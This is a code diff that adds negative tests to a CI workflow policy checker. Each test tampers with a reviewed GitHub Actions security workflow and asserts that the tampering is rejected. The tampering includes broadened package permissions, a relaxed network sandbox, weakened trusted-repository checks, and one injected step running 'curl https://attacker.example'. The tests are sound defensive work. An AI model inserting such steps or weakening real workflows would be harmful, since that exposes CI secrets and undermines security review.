@@ -378,4 +378,91 @@ assertRejected(
   'continue-on-error is forbidden'
 );
 
+assertRejected(
+  'deleted runtime security workflow',
+  (root) =>
+    rmSync(join(root, '.github/workflows/runtime-image-security.yml'), {
+      force: true,
+    }),
+  'runtime-image-security.yml: required workflow is missing'
+);
+
+assertRejected(
+  'runtime scan schedule drift',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/runtime-image-security.yml'),
+      "    - cron: '23 6 * * 1'",
+      "    - cron: '23 6 * * 2'"
+    ),
+  'schedule must exactly match the reviewed configuration'
+);
+
+assertRejected(
+  'arbitrary runtime workflow step',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/runtime-image-security.yml'),
+      '      - name: Resolve immutable image metadata',
+      '      - run: curl https://attacker.example\\n' +
+        '      - name: Resolve immutable image metadata'
+    ),
+  'source must exactly match the reviewed workflow digest'
+);
+
+assertRejected(
+  'runtime digest scanner package write permission',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/runtime-image-security.yml'),
+      '      packages: read',
+      '      packages: write'
+    ),
+  'permissions must be exactly contents: read and packages: read'
+);
+
+assertRejected(
+  'runtime digest scanner broader permission',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/runtime-image-security.yml'),
+      '      packages: read',
+      '      packages: read\n      issues: read'
+    ),
+  'permissions must be exactly contents: read and packages: read'
+);
+
+assertRejected(
+  'runtime verifier network sandbox relaxation',
+  (root) =>
+    replace(
+      join(root, '.github/scripts/verify-runtime-image.sh'),
+      '  --network none \\\n',
+      '  --network bridge \\\n'
+    ),
+  'source must exactly match the reviewed policy digest'
+);
+
+assertRejected(
+  'runtime digest scan from an untrusted workflow repository',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/runtime-image-security.yml'),
+      '          test "$TRUSTED_REPOSITORY" = "Reya-Labs/cannon"',
+      '          test -n "$TRUSTED_REPOSITORY"'
+    ),
+  'source must exactly match the reviewed workflow digest'
+);
+
+assertRejected(
+  'runtime digest scan without protected dev ancestry',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/runtime-image-security.yml'),
+      '          git -C policy merge-base --is-ancestor "$EXPECTED_REVISION" HEAD',
+      '          git -C policy cat-file -e "${EXPECTED_REVISION}^{commit}"'
+    ),
+  'source must exactly match the reviewed workflow digest'
+);
+
 console.log('Workflow policy negative probes passed.');
